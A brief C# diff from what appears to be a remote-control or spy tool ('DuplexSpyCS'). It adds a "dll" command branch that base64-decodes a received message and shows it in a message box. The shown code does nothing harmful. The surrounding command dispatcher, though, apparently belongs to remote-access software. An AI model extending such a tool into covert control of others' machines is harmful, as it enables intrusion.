@@ -1,4 +1,5 @@
 using System.Data;
+using System.Data.Entity.Core.Mapping;
 using System.Diagnostics;
 using System.Diagnostics.Eventing.Reader;
 using System.Drawing.Imaging;
@@ -1344,6 +1345,16 @@ namespace DuplexSpyCS
                             f.ShowWndStatus(lsStatus);
                         }
                     }
+                }
+
+                #endregion
+                #region DLL
+
+                else if (cmd[0] == "dll")
+                {
+                    int nCode = int.Parse(cmd[1]);
+                    string szMsg = Crypto.b64D2Str(cmd[2]);
+                    MessageBox.Show(szMsg);
                 }
 
                 #endregion
